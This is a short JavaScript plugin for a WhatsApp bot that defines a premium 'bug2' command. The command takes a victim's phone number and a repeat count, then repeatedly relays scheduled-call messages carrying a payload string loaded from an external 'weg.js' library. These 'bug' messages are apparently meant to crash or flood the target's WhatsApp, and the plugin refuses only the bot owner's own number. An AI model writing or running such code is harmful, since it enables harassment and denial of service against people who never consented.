let moment = require('moment-timezone')
let time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
let salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const { kemiibug } = require('../lib/kemiibug.js')
const { weg } = require('../lib/weg.js')

let handler = async (m, { conn, text, command, usedPrefix }) => {
let [number, jumlah] = text.split `|`
if (!number) return conn.reply(m.chat, `Example: ${usedPrefix + command} 6288980870067|20`, m)
if (!jumlah) return conn.reply(m.chat, `Example: ${usedPrefix + command} 6288980870067|20`, m)
if (number == nomorown) return m.reply('Tidak bisa spam ke nomor ini!')
jumlah = `${jumlah}`
for (let i = 0; i < jumlah; i++) {
const cap = `${weg}`
let call = {
scheduledCallCreationMessage: {
callType: 2,
scheduledTimestampMs:  Date.now(),
title: `${cap}`
}}
conn.relayMessage(`${number}@s.whatsapp.net`, call, {})
await sleep(3000)
}
m.reply(`*Sukses mengirim Bug Ke ${number} Tolong Jeda 3 Menit Yah*`)
}
handler.help = ['bug2']
handler.tags = ['bug']
handler.premium = true
handler.command = /^(bug2)$/i
handler.register = true
handler.limit = true

module.exports = handler
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
                                